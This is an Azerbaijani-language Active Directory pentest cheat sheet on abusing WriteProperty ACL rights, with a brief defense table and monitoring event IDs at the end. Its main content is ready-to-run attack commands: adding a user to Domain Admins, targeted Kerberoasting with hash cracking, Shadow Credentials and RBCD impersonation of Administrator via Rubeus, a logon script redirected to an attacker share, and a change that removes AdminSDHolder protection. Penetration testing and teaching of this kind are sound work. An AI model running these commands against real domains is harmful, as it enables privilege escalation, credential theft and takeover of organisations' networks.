# 🔐 Active Directory — WriteProperty ACL Cheat Sheet

> **WriteProperty** hüququ — bir istifadəçiyə AD obyektinin **müəyyən və ya bütün atributlarını yazmağa** icazə verir.  
> GenericWrite-dan fərqi: **daha qranülar** ola bilər — bəzən yalnız bir atributa (məs. `member`) yazma hüququ verilir.

---

## 📌 Enumeration (Axtarış)

### Bütün WriteProperty hüquqlarını tapmaq
```powershell
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                @{Name="ObjectSid";     Expression={Convert-SidToName $_.ObjectSid}},
                ActiveDirectoryRights,
                ObjectAceType -Unique
```

### Konkret obyektdə WriteProperty axtarmaq
```powershell
Get-DomainObjectAcl -Identity "jkimmich" |
  Where-Object {$_.ActiveDirectoryRights -match "WriteProperty"} |
  Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                ActiveDirectoryRights,
                ObjectAceType -Unique
```

### Konkret istifadəçinin WriteProperty-lərini tapmaq
```powershell
$sid = Convert-NameToSid "attacker_user"
Get-DomainObjectAcl | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty" -and
    $_.SecurityIdentifier -eq $sid
} | Select-Object ObjectDN, ObjectAceType, ActiveDirectoryRights
```

> ⚠️ **ObjectAceType** vacibdir — hansı atributa yazma hüququ olduğunu göstərir:
> - `00000000-0000-0000-0000-000000000000` → **Bütün atributlar** (GenericWrite ilə ekvivalent)
> - `bf9679c0-...` → yalnız `member` atributu
> - `f3a64788-...` → yalnız `servicePrincipalName`
> - `5b47d60f-...` → yalnız `msDS-KeyCredentialLink`

### BloodHound ilə
```
BloodHound → attacker_user → Outbound Object Control → WriteProperty / AddMember / AddSelf
```

---

## ⚔️ İstismar — Atributa görə

---

### 📋 `member` atributu → Qrupa girmək

**WriteProperty + `member` ACE** varsa:
```powershell
# Özünüzü qrupa əlavə edin
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user"

# Yoxlamaq
Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
```

**Net.exe ilə:**
```powershell
net group "Domain Admins" attacker_user /add /domain
```

---

### 🔑 `servicePrincipalName` atributu → Targeted Kerberoasting

**WriteProperty + `servicePrincipalName` ACE** varsa:
```powershell
# SPN əlavə et
Set-DomainObject -Identity "jkimmich" -Set @{servicePrincipalName="fake/spn.domain.local"}

# Kerberoast et
Get-DomainSPNTicket -Identity "jkimmich" -OutputFormat Hashcat | Out-File spn_hash.txt

# Hashcat ilə crack
hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt

# Cleanup — SPN-i sil
Set-DomainObject -Identity "jkimmich" -Clear servicePrincipalName
```

---

### 🗝️ `msDS-KeyCredentialLink` atributu → Shadow Credentials

**WriteProperty + `msDS-KeyCredentialLink` ACE** varsa:
```powershell
# Whisker ilə Shadow Credential əlavə et
Whisker.exe add /target:jkimmich

# Rubeus ilə TGT al
Rubeus.exe asktgt /user:jkimmich /certificate:<base64> /password:<pass> /domain:domain.local /ptt

# TGT-dən NTLM hash
Rubeus.exe asktgt ... /getcredentials

# Linux — pywhisker ilə
pywhisker.py -d domain.local -u attacker_user -p Password1 --target jkimmich --action add
```

---

### 🖥️ `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD

**WriteProperty + bu atribut** varsa (kompüter obyektlərində):
```powershell
# Fake kompüter hesabı yarat
New-MachineAccount -MachineAccount "FakePC" `
                   -Password (ConvertTo-SecureString "P@ss123!" -AsPlainText -Force)

$fakeSID = Get-DomainComputer "FakePC" -Properties objectsid | Select -Expand objectsid

# Atributu yaz
$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
      -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Set-DomainObject -Identity "TARGETPC$" `
                 -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}

# S4U2Self/S4U2Proxy ilə Administrator ticket
Rubeus.exe s4u /user:FakePC$ /rc4:<NTLM> `
              /impersonateuser:Administrator `
              /msdsspn:cifs/TARGETPC.domain.local /ptt
```

---

### 📂 `scriptPath` / `profilePath` atributu → Logon Script

```powershell
# Login skriptini dəyiş
Set-DomainObject -Identity "jkimmich" -Set @{scriptpath="\\attacker_share\evil.ps1"}

# Profil yolunu dəyiş
Set-DomainObject -Identity "jkimmich" -Set @{profilepath="\\attacker_share\profile"}
```

---

### 🕒 `adminCount` atributu → SDProp bypass

```powershell
# adminCount = 0 edərək AdminSDHolder qorumasını söndür
Set-DomainObject -Identity "jkimmich" -Set @{adminCount=0}
# Sonra ACL-ləri dəyişdirmək mümkün olur
```

---

### 📧 `altSecurityIdentities` → Sertifikat mapping

```powershell
# Öz sertifikatınızı hədəf hesabla əlaqələndirin
Set-DomainObject -Identity "jkimmich" `
                 -Set @{altSecurityIdentities="X509:<I>CN=CA<S>CN=attacker_cert"}
# Sonra sertifikatla həmin hesab kimi autentifikasiya etmək mümkündür
```

---

## 🔄 Tam Attack Chain

```
WriteProperty hüququ
    │
    ├──► member             → Qrupa əlavə ol → Privilege Escalation
    │
    ├──► servicePrincipalName → SPN əlavə et → Kerberoast → Şifrəni crack et
    │
    ├──► msDS-KeyCredentialLink → Shadow Credentials → TGT → NTLM hash
    │
    ├──► msDS-AllowedToActOnBehalf... → RBCD → S4U2Proxy → Impersonation
    │
    ├──► scriptPath / profilePath → Logon Script → Code Execution
    │
    └──► altSecurityIdentities → Cert mapping → Hesabı ələ keç
```

---

## 🧹 Cleanup

```powershell
# Qrupdan çıxmaq
Remove-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user"

# SPN silmək
Set-DomainObject -Identity "jkimmich" -Clear servicePrincipalName

# Shadow Credential silmək
Whisker.exe remove /target:jkimmich /deviceid:<GUID>

# RBCD silmək
Set-DomainObject -Identity "TARGETPC$" -Clear msds-allowedtoactonbehalfofotheridentity

# Logon script silmək
Set-DomainObject -Identity "jkimmich" -Clear scriptpath
```

---

## 🛡️ Müdafiə (Defense)

| Kontrol | Açıqlama |
|--------|----------|
| **Granülar ACL audit** | `ObjectAceType` ilə hansı atributun dəyişdirildiyini izləmək |
| **msDS-KeyCredentialLink monitoring** | Shadow Credential hücumlarını aşkarlamaq |
| **SPN dəyişikliklərini izləmək** | Targeted Kerberoasting üçün |
| **MachineAccountQuota = 0** | Fake machine account yaratmağın qarşısını almaq |
| **Protected Users Group** | Delegation hücumlarından qorunmaq |
| **AdminSDHolder** | Privileged hesabların ACL-lərini qorumaq |
| **Tiered Admin Model** | WriteProperty-nin yayılmasını məhdudlaşdırmaq |

### Monitorinq üçün Event ID-lər
```
5136 → AD atributunun dəyişdirilməsi (member, SPN, KeyCredential, RBCD)
4769 → Kerberos service ticket tələbi (Kerberoasting)
4741 → Yeni kompüter hesabı (fake machine account)
4662 → AD obyektinə giriş
```

---

## 🔧 İstifadə Olunan Alətlər

| Alət | Funksiya |
|------|----------|
| `PowerView` | Enumeration, atribut yazma |
| `BloodHound` | Attack path görselleştirme |
| `Whisker / pywhisker` | Shadow Credentials |
| `Rubeus` | Kerberoasting, TGT, S4U |
| `Impacket` | Linux-dan RBCD, S4U |
| `StandIn` | SPN, RBCD manipulyasiyası |

---

## ⚖️ WriteProperty vs GenericWrite vs WriteOwner — Müqayisə

| Xüsusiyyət | WriteProperty | GenericWrite | WriteOwner |
|-----------|--------------|-------------|------------|
| Qranüllüq | ✅ Atributa görə | ❌ Hamısı | ❌ Yalnız sahiblik |
| Sahibi dəyişmək | ❌ | ❌ | ✅ |
| Bütün atributları dəyişmək | Depends | ✅ | ❌ (WriteDACL sonra) |
| Birbaşa istismar | ✅ (atributa görə) | ✅ | Chain lazımdır |
| Shadow Credentials | ✅ (KeyCredLink) | ✅ | ✅ (chain) |
| RBCD | ✅ (AllowedToAct) | ✅ | ✅ (chain) |
| Kerberoasting | ✅ (SPN) | ✅ | ✅ (chain) |
| Qrupa girmək | ✅ (member) | ✅ | ✅ (chain) |

---

*Cheat sheet yalnız izinli pentest mühitlərində istifadə üçün nəzərdə tutulub.*
